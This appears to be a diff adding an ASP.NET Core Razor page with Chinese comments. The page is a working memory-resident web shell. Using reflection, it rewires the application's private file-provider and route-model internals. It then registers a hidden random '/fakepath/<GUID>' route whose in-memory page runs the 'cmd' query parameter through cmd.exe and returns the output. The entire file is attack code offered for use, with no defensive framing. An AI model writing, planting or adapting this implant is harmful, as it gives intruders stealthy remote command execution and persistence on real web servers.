@@ -1,0 +1,153 @@
+@page
+@using System.Reflection
+@using System.Text
+@using Microsoft.AspNetCore.Http;
+@using Microsoft.Extensions.FileProviders
+@using Microsoft.Extensions.Primitives
+@using System.IO;
+@using Microsoft.AspNetCore.Mvc.ApplicationModels
+
+@functions{
+    public class MyFileInfo : IFileInfo
+    {
+        public bool Exists { get => true; }
+        public long Length { get;}
+        public string? PhysicalPath { get; }
+        public string Name { get; set; }
+        public DateTimeOffset LastModified { get => DateTimeOffset.Now; }
+        public bool IsDirectory { get => false; }
+
+        public static Microsoft.AspNetCore.Razor.Language.RazorProjectFileSystem p;
+        public static string s;
+
+        public Stream CreateReadStream()
+        {   
+            var _fileProvider = p.GetType().GetField("_fileProvider", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(p);
+            var _options = _fileProvider.GetType().GetField("_options", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(_fileProvider);
+            var _fileProvidersProperty = _options.GetType().GetProperty("FileProviders");
+            var _fileProvidersValue = (List<Microsoft.Extensions.FileProviders.IFileProvider>) _fileProvidersProperty.GetValue(_options);
+            var originalFileSystem = _fileProvidersValue.FirstOrDefault(i => i.GetType().FullName.Equals("Microsoft.Extensions.FileProviders.PhysicalFileProvider"));
+            _fileProvider.GetType().GetField("_compositeFileProvider", BindingFlags.Instance|BindingFlags.NonPublic).SetValue(_fileProvider, originalFileSystem);
+            return new MemoryStream(Encoding.ASCII.GetBytes(@"
+            @page
+            @using System.IO
+            @using Microsoft.AspNetCore.Http
+           
+            @{
+                if (HttpContext.Request.Query.ContainsKey(""cmd"") && !string.IsNullOrEmpty(HttpContext.Request.Query[""cmd""])) 
+                {
+                    string txt = HttpContext.Request.Query[""cmd""];
+                    System.Diagnostics.Process p = new System.Diagnostics.Process();
+                    p.StartInfo.FileName = ""cmd.exe""; // Windows改为cmd.exe
+                    p.StartInfo.Arguments = ""/c "" + txt; // windows改为""/c ""
+                    p.StartInfo.UseShellExecute = false;
+                    p.StartInfo.RedirectStandardOutput = true;
+                    p.StartInfo.RedirectStandardError = true;
+                    p.Start();
+                    var content = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
+                    HttpContext.Response.Body.WriteAsync(System.Text.Encoding.UTF8.GetBytes(txt + ""<br>""));
+                    HttpContext.Response.Body.WriteAsync(System.Text.Encoding.UTF8.GetBytes(content));
+                }
+
+               HttpContext.Response.WriteAsync(""Ok"");
+            }
+            "));
+        }
+    }
+    public class TestFileFileProvider : IFileProvider
+    {
+        public static Microsoft.AspNetCore.Razor.Language.RazorProjectFileSystem p;
+        public IFileInfo GetFileInfo(string subpath)
+        {
+            var _fileProvider = p.GetType().GetField("_fileProvider", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(p);
+            var _options = _fileProvider.GetType().GetField("_options", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(_fileProvider);
+            var _fileProvidersProperty = _options.GetType().GetProperty("FileProviders");
+            var _fileProvidersValue = (List<Microsoft.Extensions.FileProviders.IFileProvider>) _fileProvidersProperty.GetValue(_options);
+            var originalFileSystem = _fileProvidersValue.FirstOrDefault(i => i.GetType().FullName.Equals("Microsoft.Extensions.FileProviders.PhysicalFileProvider"));
+            MyFileInfo.p = p;
+            MyFileInfo.s = subpath;
+            if (subpath.Contains("Shell_"))
+            {
+                var f = new MyFileInfo();
+                f.Name = subpath;
+                return f;
+            }
+            else
+            {
+            return  (IFileInfo)  originalFileSystem.GetType().GetMethod("GetFileInfo").Invoke(originalFileSystem, new object[]{ subpath });
+            }
+        }
+        public IDirectoryContents GetDirectoryContents(string subpath) { return null; }
+        public IChangeToken Watch(string filter) { return null; }
+    }
+    
+    
+    public class ShellPageRouteModelProvider : IPageRouteModelProvider
+    {
+        public int Order { get => -1000 + 10; }
+        public string _pagePaht;
+
+        public ShellPageRouteModelProvider(string pagePath)
+        {
+            _pagePaht = pagePath;
+        }
+        public void OnProvidersExecuting(PageRouteModelProviderContext context)
+        {
+            var pagePath = _pagePaht;
+            var relativePath = "/Shell_";
+            var routeModel = new PageRouteModel(relativePath, pagePath);
+            routeModel.RouteValues.Add("page", routeModel.ViewEnginePath);
+            routeModel.Selectors.Add(new SelectorModel
+            {
+                AttributeRouteModel = new AttributeRouteModel
+                {
+                    Template = AttributeRouteModel.CombineTemplates(pagePath, null),
+                },
+                EndpointMetadata =
+                {
+                    new PageRouteMetadata(pagePath, null)
+                }
+            });
+            context.RouteModels.Add(routeModel);
+        }
+
+        public void OnProvidersExecuted(PageRouteModelProviderContext context)
+        {
+        }
+
+    }
+}
+
+@{
+    var pagePath = "/fakepath/" +  Guid.NewGuid().ToString("D");
+    var iActionDescriptorProviderList = (Microsoft.AspNetCore.Mvc.Abstractions.IActionDescriptorProvider[]) this.HttpContext.RequestServices.GetService(typeof(IEnumerable<>).MakeGenericType(typeof(Microsoft.AspNetCore.Mvc.Abstractions.IActionDescriptorProvider)));
+    var pageActionDescriptorProvider = iActionDescriptorProviderList.FirstOrDefault(m => m.GetType().FullName.Equals("Microsoft.AspNetCore.Mvc.RazorPages.Infrastructure.PageActionDescriptorProvider"));
+    var routeModelProvidersField = pageActionDescriptorProvider.GetType().GetField("_routeModelProviders", BindingFlags.Instance | BindingFlags.NonPublic);
+    var routeModelProviders = (Microsoft.AspNetCore.Mvc.ApplicationModels.IPageRouteModelProvider[]) routeModelProvidersField.GetValue(pageActionDescriptorProvider);
+    var _list = routeModelProviders.ToList();
+    _list.Add(new ShellPageRouteModelProvider(pagePath));
+    routeModelProvidersField.SetValue(pageActionDescriptorProvider, _list.ToArray());
+   
+
+    var myFileFileProvider = new TestFileFileProvider();
+    var razorProjectEngine =this.HttpContext.RequestServices.GetService(typeof(Microsoft.AspNetCore.Razor.Language.RazorProjectEngine));
+    var fileSystem = razorProjectEngine.GetType().GetProperty("FileSystem").GetValue(razorProjectEngine);
+    var _fileProvider = fileSystem.GetType().GetField("_fileProvider", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(fileSystem);
+    var _options = _fileProvider.GetType().GetField("_options", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(_fileProvider);
+    var _fileProvidersProperty = _options.GetType().GetProperty("FileProviders");
+    var _fileProvidersValue = (List<Microsoft.Extensions.FileProviders.IFileProvider>) _fileProvidersProperty.GetValue(_options);
+    TestFileFileProvider.p = (Microsoft.AspNetCore.Razor.Language.RazorProjectFileSystem) fileSystem;
+    _fileProvidersValue.Add(myFileFileProvider);
+
+
+    // 通知更新前需要保证RazorProjectFileSystem为原来的
+    var originalFileSystem = _fileProvidersValue.FirstOrDefault(i => i.GetType().FullName.Equals("Microsoft.Extensions.FileProviders.PhysicalFileProvider"));
+    _fileProvider.GetType().GetField("_compositeFileProvider", BindingFlags.Instance|BindingFlags.NonPublic).SetValue(_fileProvider, originalFileSystem);
+    this.HttpContext.RequestServices.GetService(typeof(Microsoft.AspNetCore.Mvc.Infrastructure.IActionDescriptorCollectionProvider)).GetType().GetMethod("UpdateCollection", BindingFlags.NonPublic | BindingFlags.Instance).Invoke(this.HttpContext.RequestServices.GetService(typeof(Microsoft.AspNetCore.Mvc.Infrastructure.IActionDescriptorCollectionProvider)), null);
+
+    // 修改为自定义的处理
+    var selfFileSystem = _fileProvidersValue.LastOrDefault(i => i.GetType().FullName.Contains("TestFileFileProvider"));
+    _fileProvider.GetType().GetField("_compositeFileProvider", BindingFlags.Instance|BindingFlags.NonPublic).SetValue(_fileProvider, selfFileSystem);
+
+    this.HttpContext.Response.WriteAsync(pagePath);
+}
